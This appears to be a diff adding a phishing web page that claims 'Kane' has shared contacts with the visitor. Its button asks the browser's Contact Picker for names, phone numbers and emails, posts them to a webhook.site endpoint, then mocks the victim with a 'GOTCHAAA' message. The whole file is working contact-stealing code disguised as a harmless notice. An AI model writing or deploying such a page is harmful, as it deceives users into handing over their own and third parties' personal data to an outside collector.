@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>📲 Several Contacts Shared with You</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding: 20px;
+      }
+      button {
+        background: #003087;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        cursor: pointer;
+        font-size: 18px;
+      }
+      #status {
+        margin-top: 20px;
+        font-weight: bold;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>🔔 <strong>Kane</strong> shared several contacts with you!</h1>
+    <p>Click below to save it to your address book:</p>
+    <button onclick="gotchaTime()">👇 View in Contacts Book 👇</button>
+    <p id="status"></p>
+
+    <script>
+      async function gotchaTime() {
+        const statusEl = document.getElementById("status");
+        statusEl.textContent = "Loading...";
+
+        try {
+          const contacts = await navigator.contacts.select(
+            ["name", "tel", "email"],
+            { multiple: true }
+          );
+
+          await fetch("https://webhook.site/YOUR_UNIQUE_ID", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ contacts }),
+          });
+
+          statusEl.innerHTML = `
+                    <span style="color:red; font-size: 22px;">😂 GOTCHAAA!😂</span><br><br>
+                    <small style="color: gray;"Your L.></small>
+                `;
+        } catch (err) {
+          statusEl.innerHTML = `<span style="color:green;">You live another day.</span>`;
+        }
+      }
+    </script>
+  </body>
+</html>
